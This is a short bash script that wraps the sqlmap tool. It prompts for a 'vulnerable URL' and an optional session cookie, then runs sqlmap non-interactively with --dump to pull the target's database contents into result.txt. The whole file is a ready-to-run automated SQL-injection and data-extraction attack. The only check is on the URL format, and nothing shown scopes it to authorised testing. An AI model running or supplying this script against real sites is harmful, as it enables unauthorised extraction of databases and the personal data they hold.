#!/bin/bash

echo "Enter the vulnerable URL:"
read URL

if [[ ! "$URL" =~ ^https?://([a-zA-Z0-9.-]+)(:[0-9]+)?(/.*)?(\?.*)?$ ]]; then
    echo "Invalid URL for SQLmap."
else
    echo "Valid URL for SQLmap"
    echo "Do you have a cookie related to this? y/n"
    read IsCookie

    if [[ "$IsCookie" =~ ^y$ ]]; then
    echo "Insert the cookie in the format name=value:"
        read cookie
        sqlmap --flush -u "$URL" --cookie="$cookie" --dump --batch > result.txt
    else
        sqlmap --flush -u "$URL" --dump --batch > result.txt
    fi
fi

echo "Done"
